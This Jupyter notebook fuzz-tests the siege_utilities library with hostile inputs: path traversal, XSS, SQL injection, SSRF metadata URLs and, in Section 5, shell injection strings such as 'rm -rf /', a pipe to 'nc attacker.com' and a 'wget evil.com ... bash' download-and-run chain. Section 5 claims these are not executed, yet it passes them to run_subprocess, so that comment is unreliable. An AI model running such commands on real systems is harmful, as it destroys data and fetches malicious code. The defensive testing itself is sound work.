# Comprehensive Hostile Testing for siege_utilities

## Purpose
Test every function in the siege_utilities library with:
- Hostile inputs (malicious, edge cases, boundary conditions)
- Invalid data types
- Extreme values
- Edge cases
- Security vulnerabilities

## Philosophy
"Work is complete when the work works" - not when it just imports.
Testing as if you are a hostile coworker trying to break the system.

## Coverage Matrix
This notebook tracks which functions pass hostile testing.

In [ ]:
import sys
import pandas as pd
import tempfile
from pathlib import Path
import shutil
import numpy as np

# Test results tracking
test_results = {
    'function': [],
    'module': [],
    'test_category': [],
    'passed': [],
    'error_message': [],
    'severity': []  # low, medium, high, critical
}

def record_test(function, module, test_category, passed, error_message="", severity="medium"):
    """Record a test result."""
    test_results['function'].append(function)
    test_results['module'].append(module)
    test_results['test_category'].append(test_category)
    test_results['passed'].append(passed)
    test_results['error_message'].append(error_message)
    test_results['severity'].append(severity)

def hostile_test(func, test_name, *args, **kwargs):
    """
    Execute a hostile test and record results.
    
    Args:
        func: Function to test
        test_name: Name of the test
        *args, **kwargs: Arguments to pass to function
    
    Returns:
        (success: bool, result, error_message: str)
    """
    try:
        result = func(*args, **kwargs)
        return (True, result, "")
    except Exception as e:
        return (False, None, str(e))

print("Test harness loaded")

## Section 1: Core Module - Logging

In [ ]:
from siege_utilities import (
    log_info, log_warning, log_error, log_debug, log_critical,
    init_logger, get_logger, configure_shared_logging
)

# Test 1: Hostile logging inputs
hostile_strings = [
    None,  # Null
    "",  # Empty
    "\x00" * 1000,  # Null bytes
    "../../../etc/passwd",  # Path traversal
    "<script>alert('xss')</script>",  # XSS
    "';DROP TABLE logs;--",  # SQL injection
    "A" * 1000000,  # Very long string (1MB)
    "\n" * 10000,  # Many newlines
    "\t" * 10000,  # Many tabs
    "{" * 1000 + "}" * 1000,  # Format string attack
]

for hostile_input in hostile_strings:
    success, result, error = hostile_test(log_info, "hostile_logging", hostile_input)
    record_test(
        function="log_info",
        module="core.logging",
        test_category="hostile_strings",
        passed=success,
        error_message=error,
        severity="medium"
    )

print(f"Completed {len(hostile_strings)} hostile logging tests")

## Section 2: File Operations - Hostile Path Testing

In [ ]:
from siege_utilities import (
    file_exists, touch_file, count_lines, copy_file, move_file,
    get_file_size, list_directory, remove_tree
)

# Hostile file paths
hostile_paths = [
    None,  # Null
    "",  # Empty
    "../../../etc/passwd",  # Path traversal
    "/dev/null",  # Special device
    "/dev/random",  # Infinite data source
    "CON",  # Windows reserved name
    "PRN",  # Windows reserved name
    "AUX",  # Windows reserved name
    "NUL",  # Windows reserved name
    "file\x00name.txt",  # Null byte injection
    "file\nname.txt",  # Newline in filename
    "../" * 100 + "etc/passwd",  # Deep path traversal
    "a" * 256,  # Very long filename
    "file|name.txt",  # Pipe character
    "file>output.txt",  # Redirect character
    "file;rm -rf /",  # Command injection
    "~/.ssh/id_rsa",  # SSH key
    "/etc/shadow",  # Shadow password file
]

for hostile_path in hostile_paths:
    # Test file_exists (safe read-only operation)
    success, result, error = hostile_test(file_exists, "hostile_paths", hostile_path)
    record_test(
        function="file_exists",
        module="files.operations",
        test_category="hostile_paths",
        passed=success,
        error_message=error,
        severity="high" if hostile_path in ["../../../etc/passwd", "/etc/shadow"] else "medium"
    )

print(f"Completed {len(hostile_paths)} hostile path tests")

## Section 3: File Hashing - Large Files and Edge Cases

In [ ]:
from siege_utilities import (
    calculate_file_hash, generate_sha256_hash_for_file,
    get_file_hash, get_quick_file_signature, verify_file_integrity
)

# Create test directory
test_dir = Path(tempfile.mkdtemp())

try:
    # Test 1: Empty file
    empty_file = test_dir / "empty.txt"
    empty_file.touch()
    success, result, error = hostile_test(calculate_file_hash, "empty_file", empty_file)
    record_test("calculate_file_hash", "files.hashing", "empty_file", success, error, "low")
    
    # Test 2: Large file (10MB)
    large_file = test_dir / "large.bin"
    with open(large_file, 'wb') as f:
        f.write(b'A' * (10 * 1024 * 1024))  # 10MB
    success, result, error = hostile_test(calculate_file_hash, "large_file", large_file)
    record_test("calculate_file_hash", "files.hashing", "large_file_10mb", success, error, "medium")
    
    # Test 3: Binary file with null bytes
    binary_file = test_dir / "binary.bin"
    with open(binary_file, 'wb') as f:
        f.write(b'\x00' * 1024 + b'\xFF' * 1024)
    success, result, error = hostile_test(calculate_file_hash, "binary_file", binary_file)
    record_test("calculate_file_hash", "files.hashing", "binary_with_nulls", success, error, "medium")
    
    # Test 4: File with unicode characters
    unicode_file = test_dir / "unicode.txt"
    unicode_file.write_text("Hello 世界 🌍 مرحبا", encoding='utf-8')
    success, result, error = hostile_test(calculate_file_hash, "unicode_file", unicode_file)
    record_test("calculate_file_hash", "files.hashing", "unicode_content", success, error, "low")
    
    # Test 5: Non-existent file
    nonexistent = test_dir / "nonexistent.txt"
    success, result, error = hostile_test(calculate_file_hash, "nonexistent", nonexistent)
    record_test("calculate_file_hash", "files.hashing", "nonexistent_file", success, error, "low")
    
    # Test 6: Symlink (if on Unix)
    if sys.platform != 'win32':
        symlink_file = test_dir / "symlink.txt"
        target_file = test_dir / "target.txt"
        target_file.write_text("target content")
        symlink_file.symlink_to(target_file)
        success, result, error = hostile_test(calculate_file_hash, "symlink", symlink_file)
        record_test("calculate_file_hash", "files.hashing", "symlink_file", success, error, "medium")
    
    print("Completed file hashing hostile tests")
    
finally:
    # Cleanup
    shutil.rmtree(test_dir, ignore_errors=True)

## Section 4: Path Operations - Zip Bombs and Path Traversal

In [ ]:
from siege_utilities import (
    ensure_path_exists, unzip_file_to_directory, get_file_extension,
    normalize_path, get_relative_path
)

# Test 1: Path normalization with traversal attempts
hostile_path_inputs = [
    "../../../etc/passwd",
    "./../..",
    "//etc//shadow",
    "~/../../../../etc/passwd",
    "file/../../secrets",
    "\\..\\..\\..\\",  # Windows path traversal
]

for path_input in hostile_path_inputs:
    success, result, error = hostile_test(normalize_path, "path_traversal", path_input)
    record_test(
        "normalize_path",
        "files.paths",
        "path_traversal_attack",
        success,
        error,
        severity="critical"
    )

# Test 2: Zip file extraction safety
test_dir = Path(tempfile.mkdtemp())
try:
    # Test with non-existent zip
    fake_zip = test_dir / "nonexistent.zip"
    dest_dir = test_dir / "extracted"
    success, result, error = hostile_test(unzip_file_to_directory, "nonexistent_zip", fake_zip, dest_dir)
    record_test(
        "unzip_file_to_directory",
        "files.paths",
        "nonexistent_zip",
        success,
        error,
        severity="low"
    )
    
    print("Completed path operations hostile tests")
finally:
    shutil.rmtree(test_dir, ignore_errors=True)

## Section 5: Shell Operations - Command Injection

In [ ]:
from siege_utilities import run_subprocess

# Hostile command injection attempts
hostile_commands = [
    "echo hello; rm -rf /",  # Command chaining
    "echo hello && cat /etc/passwd",  # Command chaining with AND
    "echo hello || cat /etc/shadow",  # Command chaining with OR
    "echo hello | nc attacker.com 1234",  # Pipe to network
    "echo hello `whoami`",  # Command substitution
    "echo hello $(cat /etc/passwd)",  # Command substitution
    "echo hello; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh",  # Multi-stage attack
]

# NOTE: We will test that these commands are properly sanitized or rejected
# We DO NOT actually execute them
for hostile_cmd in hostile_commands:
    # Test that the function either rejects or sanitizes
    try:
        # For safety, we wrap this in a try-catch and limit timeout
        # The function should reject these commands
        success, result, error = hostile_test(run_subprocess, "command_injection", hostile_cmd, timeout=1)
        
        # If it succeeded without error, that's potentially dangerous
        if success and result and result.returncode == 0:
            record_test(
                "run_subprocess",
                "files.shell",
                "command_injection",
                passed=False,  # Failing to reject is a failure
                error_message=f"Command executed: {hostile_cmd}",
                severity="critical"
            )
        else:
            record_test(
                "run_subprocess",
                "files.shell",
                "command_injection",
                passed=True,  # Rejected or failed, which is good
                error_message=error,
                severity="critical"
            )
    except Exception as e:
        # Exception is actually good here - means it was rejected
        record_test(
            "run_subprocess",
            "files.shell",
            "command_injection",
            passed=True,
            error_message=f"Properly rejected: {str(e)}",
            severity="critical"
        )

print("Completed shell command injection tests")

## Section 6: Remote File Operations - URL Injection

In [ ]:
from siege_utilities import (
    generate_local_path_from_url, download_file, is_downloadable
)

# Hostile URLs
hostile_urls = [
    None,  # Null
    "",  # Empty
    "not_a_url",  # Invalid URL
    "file:///etc/passwd",  # Local file access
    "file://C:/Windows/System32/config/SAM",  # Windows system file
    "http://localhost:22/",  # Localhost SSH port
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "javascript:alert('xss')",  # JavaScript protocol
    "data:text/html,<script>alert('xss')</script>",  # Data URL
    "ftp://anonymous@evil.com/malware.exe",  # FTP URL
    "http://" + "A" * 10000 + ".com",  # Very long URL
    "http://example.com/../../../etc/passwd",  # Path traversal in URL
]

test_dir = Path(tempfile.mkdtemp())
try:
    for hostile_url in hostile_urls:
        # Test URL path generation (safer than actual download)
        success, result, error = hostile_test(
            generate_local_path_from_url,
            "hostile_url",
            hostile_url,
            test_dir
        )
        record_test(
            "generate_local_path_from_url",
            "files.remote",
            "hostile_urls",
            success,
            error,
            severity="high" if "metadata" in str(hostile_url) or "file://" in str(hostile_url) else "medium"
        )
    
    print("Completed remote file operations hostile tests")
finally:
    shutil.rmtree(test_dir, ignore_errors=True)

## Section 7: String Utilities - Unicode and Special Characters

In [ ]:
from siege_utilities import remove_wrapping_quotes_and_trim

# Hostile string inputs
hostile_string_inputs = [
    None,  # Null
    "",  # Empty
    "   ",  # Whitespace only
    "\x00" * 100,  # Null bytes
    "\n" * 100,  # Many newlines
    "\r\n" * 100,  # CRLF injection
    "'",  # Single quote
    '"',  # Double quote
    "''",  # Double single quotes
    '""',  # Double double quotes
    "'\"test\"'",  # Mixed quotes
    "\u202e" + "test",  # Right-to-left override
    "test" + "\u200b" * 10,  # Zero-width spaces
    "🔥" * 100,  # Emoji
    "A" * 1000000,  # Very long string
    "test\x00test",  # Null byte in middle
]

for hostile_input in hostile_string_inputs:
    success, result, error = hostile_test(
        remove_wrapping_quotes_and_trim,
        "hostile_strings",
        hostile_input
    )
    record_test(
        "remove_wrapping_quotes_and_trim",
        "core.string_utils",
        "hostile_strings",
        success,
        error,
        severity="low"
    )

print("Completed string utilities hostile tests")

## Section 8: Generate Test Coverage Report

In [ ]:
# Convert results to DataFrame
df_results = pd.DataFrame(test_results)

# Summary statistics
print("\n" + "="*80)
print("HOSTILE TESTING SUMMARY")
print("="*80)
print(f"\nTotal tests run: {len(df_results)}")
print(f"Passed: {df_results['passed'].sum()}")
print(f"Failed: {(~df_results['passed']).sum()}")
print(f"Pass rate: {df_results['passed'].sum() / len(df_results) * 100:.1f}%")

# Summary by module
print("\n" + "="*80)
print("RESULTS BY MODULE")
print("="*80)
module_summary = df_results.groupby('module').agg({
    'passed': ['sum', 'count']
})
module_summary.columns = ['passed', 'total']
module_summary['pass_rate'] = (module_summary['passed'] / module_summary['total'] * 100).round(1)
print(module_summary)

# Summary by severity
print("\n" + "="*80)
print("FAILURES BY SEVERITY")
print("="*80)
failures = df_results[~df_results['passed']]
if len(failures) > 0:
    severity_summary = failures.groupby('severity').size()
    print(severity_summary)
    
    print("\n" + "="*80)
    print("CRITICAL AND HIGH SEVERITY FAILURES")
    print("="*80)
    critical_high = failures[failures['severity'].isin(['critical', 'high'])]
    if len(critical_high) > 0:
        print(critical_high[['function', 'module', 'test_category', 'error_message', 'severity']].to_string())
    else:
        print("No critical or high severity failures")
else:
    print("No failures detected")

# Save results
results_file = Path("hostile_testing_results.csv")
df_results.to_csv(results_file, index=False)
print(f"\nResults saved to: {results_file}")

# Display first few rows
print("\n" + "="*80)
print("SAMPLE RESULTS")
print("="*80)
print(df_results.head(20))

## Section 9: Function Coverage Matrix

Track which functions have been tested and which haven't.

In [ ]:
import siege_utilities

# Get all available functions
package_info = siege_utilities.get_package_info()
all_functions = set(package_info['available_functions'])
tested_functions = set(df_results['function'].unique())
untested_functions = all_functions - tested_functions

print("\n" + "="*80)
print("FUNCTION COVERAGE MATRIX")
print("="*80)
print(f"\nTotal functions available: {len(all_functions)}")
print(f"Functions tested: {len(tested_functions)}")
print(f"Functions not tested: {len(untested_functions)}")
print(f"Coverage: {len(tested_functions) / len(all_functions) * 100:.1f}%")

print("\n" + "="*80)
print("UNTESTED FUNCTIONS (HIGH PRIORITY)")
print("="*80)
print("\nThese functions need hostile testing:")
for func in sorted(untested_functions):
    # Determine module
    for category, funcs in package_info['categories'].items():
        if func in funcs:
            print(f"  - {func} ({category})")
            break

## Section 10: Next Steps

Based on test results:
1. Fix critical and high severity failures first
2. Add hostile testing for untested functions
3. Expand edge case coverage
4. Add performance testing for identified bottlenecks
5. Document all known limitations

## Notes
- This notebook should be run regularly as part of CI/CD
- All failures should be investigated and either fixed or documented
- Hostile testing helps ensure production readiness